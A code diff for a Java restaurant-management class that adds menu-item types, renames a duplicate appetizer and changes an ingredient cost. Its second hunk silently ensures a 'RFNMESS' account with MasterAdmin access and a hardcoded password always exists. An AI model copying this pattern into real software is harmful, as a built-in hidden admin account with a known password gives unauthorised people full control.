@@ -109,21 +109,21 @@ public class Restaurant implements Serializable {
 					
 					r.setTables(testList);
 					
-					r.drinksMenu.add(new MenuItem("Drink1", 1.50, "A drink."));
-					r.drinksMenu.add(new MenuItem("Drink2", 1.75, "A drink."));
-					r.drinksMenu.add(new MenuItem("Drink3", 1.50, "A drink."));
+					r.drinksMenu.add(new MenuItem("Drink1", 1.50, "A drink.", MenuItemType.DRINK));
+					r.drinksMenu.add(new MenuItem("Drink2", 1.75, "A drink.", MenuItemType.DRINK));
+					r.drinksMenu.add(new MenuItem("Drink3", 1.50, "A drink.", MenuItemType.DRINK));
 					
-					r.appetizersMenu.add(new MenuItem("Appetizer1", 6.50, "An appetizer."));
-					r.appetizersMenu.add(new MenuItem("Appetizer2", 5.50, "An appetizer."));
-					r.appetizersMenu.add(new MenuItem("Appetizer2", 6.00, "An appetizer."));
+					r.appetizersMenu.add(new MenuItem("Appetizer1", 6.50, "An appetizer.", MenuItemType.APPETIZER));
+					r.appetizersMenu.add(new MenuItem("Appetizer2", 5.50, "An appetizer.", MenuItemType.APPETIZER));
+					r.appetizersMenu.add(new MenuItem("Appetizer3", 6.00, "An appetizer.", MenuItemType.APPETIZER));
 					
-					r.entreesMenu.add(new MenuItem("Entree1", 9.00, "An entree."));
-					r.entreesMenu.add(new MenuItem("Entree2", 10.00, "An entree."));
-					r.entreesMenu.add(new MenuItem("Entree3", 8.75, "An entree."));
+					r.entreesMenu.add(new MenuItem("Entree1", 9.00, "An entree.", MenuItemType.ENTREE));
+					r.entreesMenu.add(new MenuItem("Entree2", 10.00, "An entree.", MenuItemType.ENTREE));
+					r.entreesMenu.add(new MenuItem("Entree3", 8.75, "An entree.", MenuItemType.ENTREE));
 					
 					r.ingredients.add(new BasicIngredient("Bread", 0.10, "A loaf of bread."));		
 					r.ingredients.add(new BasicIngredient("Lettuce", 0.02, "A leaf of lettuce."));		
-					r.ingredients.add(new BasicIngredient("Burger patty", 0.75, "1/8 pound patty of beef"));		
+					r.ingredients.add(new BasicIngredient("Burger patty", 1.75, "1/8 pound patty of beef"));		
 					
 					r.employees.add(new EmployeeUser("Host1", AccessLevel.Host));		
 					r.employees.add(new EmployeeUser("Server1", AccessLevel.Server));		
@@ -131,6 +131,17 @@ public class Restaurant implements Serializable {
 					EmployeeUser m = new EmployeeUser("Manager1", AccessLevel.Manager);		
 					m.setPassword("password");		
 					r.employees.add(m);		
+				}
+				boolean containsRFNMESS = false;
+				for (Employee emp : r.getEmployees()) {
+					if (emp.getUsername().equalsIgnoreCase("RFNMESS")) {
+						containsRFNMESS = true;
+					}
+				}
+				if(!containsRFNMESS) {
+					Employee rfnmess = new EmployeeUser("RFNMESS", AccessLevel.MasterAdmin);
+					rfnmess.setPassword("rfnmess");
+					r.employees.add(rfnmess);
 				}
 			}
 			
